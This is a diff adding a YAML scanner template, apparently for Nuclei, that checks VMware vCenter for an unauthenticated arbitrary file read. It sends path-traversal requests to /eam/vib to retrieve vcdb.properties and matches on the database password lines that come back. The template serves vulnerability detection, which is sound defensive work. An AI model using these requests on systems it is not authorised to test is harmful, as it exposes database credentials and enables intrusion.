@@ -1,0 +1,32 @@
+id: vmware-vcenter-lfi
+
+info:
+  name: VMware vCenter Unauthenticated Arbitrary File Read
+  author: dwisiswant0
+  severity: high
+  reference:
+    - https://kb.vmware.com/s/article/7960893
+    - https://twitter.com/ptswarm/status/1316016337550938122
+  tags: vmware,lfi,vcenter
+
+requests:
+  - raw:
+      - |
+        GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - "C:\\ProgramData\\VMware\\VMware+VirtualCenter"  # vCenter Server 5.5 and earlier (Windows 2008)
+        - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter"  # Other Windows versions
+        - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx"  # vCenter Server => 6.0
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s="
+
+      - type: status
+        status:
+          - 200
